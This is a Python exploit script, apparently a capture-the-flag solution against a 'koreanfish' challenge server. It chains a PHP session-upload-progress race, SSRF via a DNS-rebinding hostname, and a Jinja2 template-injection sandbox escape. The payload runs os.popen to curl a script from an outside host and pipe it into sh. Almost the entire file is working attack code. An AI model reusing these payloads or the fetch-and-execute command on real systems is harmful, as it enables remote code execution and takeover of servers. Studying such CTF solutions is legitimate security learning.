import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool



HOST = 'http://koreanfish.balsnctf.com/index.php'
sess_name = 'iamkaibro'

headers = {
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
}

payload = """
{% for c in []['__class__']['__base__']['__subclasses__']() %}
{% if c['__name__'] == 'catch_warnings' %}
{% for b in c['__init__']['__globals__']['values']() %}
{% if b['__class__']=={}['__class__'] %}
{% if 'eval' in b['keys']() %}
{% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %}{% endif %}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
"""

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': payload
    }
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    while 1:
        url = '{}?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr={}'.format(HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        print [c]

if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)

